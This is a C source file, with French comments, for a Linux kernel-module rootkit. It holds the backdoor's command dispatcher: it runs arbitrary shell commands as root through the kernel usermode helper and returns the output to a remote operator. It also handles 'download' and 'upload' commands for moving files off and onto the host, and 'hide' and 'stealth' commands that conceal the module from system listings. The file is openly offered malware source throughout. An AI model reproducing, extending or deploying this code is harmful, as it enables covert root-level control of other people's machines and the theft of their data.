#include "rootkit.h"

// Fonction pour obtenir le chemin absolue a partir du relatif dans le shell
int resolve_path(const char *base, const char *input, char *resolved, size_t max_len) {
    char temp[PATH_MAX];
    struct path p;
    int err;
    char *ret;

    if (input[0] == '/') {
        strncpy(temp, input, PATH_MAX);
        temp[PATH_MAX-1] = '\0';
    } else {
        snprintf(temp, PATH_MAX, "%s/%s", base, input);
        temp[PATH_MAX-1] = '\0';
    }
    
    err = kern_path(temp, LOOKUP_FOLLOW, &p);
    if (err == 0 && S_ISDIR(d_inode(p.dentry)->i_mode)) {
        ret = d_path(&p, resolved, max_len);
        if (!IS_ERR(ret)) {
            strncpy(resolved, ret, max_len);
            resolved[max_len-1] = '\0';
            path_put(&p);
            return 0;
        }
        path_put(&p);
    }
    return -1;
}

// Fonction spécifique pour executer la commande cd et sa reponse
void command_cd(const char *new_dir, char *msg, size_t msglen) {
    char resolved[PATH_MAX];

    if (strlen(new_dir) == 0 || strlen(new_dir) >= PATH_MAX) {
        snprintf(msg, msglen, "[INFO] Invalid directory\n");
        return;
    }
    if (resolve_path(current_dir, new_dir, resolved, PATH_MAX) == 0) {
        strncpy(current_dir, resolved, PATH_MAX);
        current_dir[PATH_MAX-1] = '\0';
        snprintf(msg, msglen, "[INFO] Changed directory to %s\n", current_dir);
    } else {
        snprintf(msg, msglen, "[INFO] Directory %s doesn't exist or isn't accessible\n", new_dir);
    }
}

// Fonction pour executer les commandes standard autre que "cd" et envoyer sa reponse
void command_basic(const char *cmd) {
    char full_cmd[MAX_CMD_LEN + PATH_MAX + 64];
    struct file *clear_file;
    char *argv[] = { "/bin/sh", "-c", full_cmd, NULL };
    char *envp[] = { "HOME=/", "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
    struct subprocess_info *sub_info;
    struct file *f;
    size_t chunk_size = 4096;
    char *buf;
    loff_t pos = 0;
    ssize_t len = 0;
    int has_output = 0;

    clear_file = filp_open(OUTPUT_COMMAND_PATH, O_WRONLY | O_CREAT | O_TRUNC, 0644);
    if (!IS_ERR(clear_file)) {
        filp_close(clear_file, NULL);
    } else {
        send_response("[INFO] Failed to prepare output file\n");
        send_response(END_OUTPUT);
        return;
    }

    snprintf(full_cmd, sizeof(full_cmd), "cd %s && %s > %s 2>&1", current_dir, cmd, OUTPUT_COMMAND_PATH);
    sub_info = call_usermodehelper_setup(argv[0], argv, envp, GFP_KERNEL, NULL, NULL, NULL);
    if (sub_info) {
        call_usermodehelper_exec(sub_info, UMH_WAIT_PROC);
    }

    msleep(100);

    f = filp_open(OUTPUT_COMMAND_PATH, O_RDONLY, 0);
    if (!IS_ERR(f)) {
        buf = kmalloc(chunk_size, GFP_KERNEL);
        if (!buf) {
            send_response("[INFO] Memory allocation error\n");
            filp_close(f, NULL);
            send_response(END_OUTPUT);
            return;
        }

        while ((len = kernel_read(f, buf, chunk_size, &pos)) > 0) {
            send_chunk_response(buf, len);
            has_output = 1;
        }

        kfree(buf);
        filp_close(f, NULL);

        if (len < 0) {
            send_response("[INFO] Error reading output file\n");
        } else if (!has_output) {
            send_response("[INFO] Command executed, but no output\n");
        }

        send_response(END_OUTPUT);
    } else {
        send_response("[INFO] Failed to open output file\n");
        send_response(END_OUTPUT);
    }
}

// Fonction qui execute une commande ou download/upload et envoie sa reponse
void execute_and_respond(const char *cmd) {
    char msg[MAX_MSG_LEN] = {0};
    const char *new_dir;
    const char *filepath;
    
    if (strncmp(cmd, "cd ", 3) == 0) {
        new_dir = cmd + 3;
        while (*new_dir == ' '){
             new_dir++;
        }
        command_cd(new_dir, msg, MAX_MSG_LEN);
        send_response(msg);
        send_response(END_OUTPUT);
    } else if (strncmp(cmd, "download ", 9) == 0) {
        filepath = cmd + 9;
        while (*filepath == ' ') {
            filepath++;
        }
        if (strlen(filepath) == 0) {
            send_response("[ERROR] No file specified for download\n");
            send_response(END_OUTPUT);
        } else {
            send_file(filepath);
        }
    } else if (strncmp(cmd, "upload ", 7) == 0) {
        filepath = cmd + 7;
        while (*filepath == ' ') {
            filepath++;
        }
        if (strlen(filepath) == 0) {
            send_response("[ERROR] No destination specified for upload\n");
            send_response(END_OUTPUT);
        } else {
            send_response("[INFO] Ready to receive file\n");
            receive_file(filepath);
        }
    } else if (strncmp(cmd, "hide", 4) == 0) {
        hide_module();
        send_response("[INFO] Module hidden from system lists\n");
        send_response(END_OUTPUT);
    } else if (strncmp(cmd, "show", 4) == 0) {
        show_module();
        send_response("[INFO] Module revealed in system lists\n");
        send_response(END_OUTPUT);
    } else if (strncmp(cmd, "stealth_on", 10) == 0) {
        enable_advanced_hiding();
        send_response(END_OUTPUT);
    } else if (strncmp(cmd, "stealth_off", 11) == 0) {
        disable_advanced_hiding();
        send_response(END_OUTPUT);
    } else {
        command_basic(cmd);
    }
}